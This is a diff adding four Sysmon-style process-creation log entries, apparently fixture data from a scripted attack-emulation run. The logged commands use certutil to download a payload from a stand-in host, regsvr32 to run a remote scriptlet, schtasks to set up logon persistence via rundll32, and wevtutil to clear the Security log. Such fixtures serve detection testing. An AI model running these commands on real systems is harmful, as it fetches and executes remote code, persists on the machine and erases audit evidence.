@@ -1,0 +1,4 @@
+{"UtcTime":"2026-10-20 10:05:02","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64","ParentCommandLine":"powershell.exe -File step02.ps1"}
+{"UtcTime":"2026-10-20 10:10:01","Image":"C:\\Windows\\System32\\regsvr32.exe","CommandLine":"regsvr32 /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll","ParentCommandLine":"powershell.exe -File step03.ps1"}
+{"UtcTime":"2026-10-20 10:15:04","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f","ParentCommandLine":"powershell.exe -File step04.ps1"}
+{"UtcTime":"2026-10-20 10:15:09","Image":"C:\\Windows\\System32\\wevtutil.exe","CommandLine":"wevtutil cl Security","ParentCommandLine":"powershell.exe -File step04.ps1"}
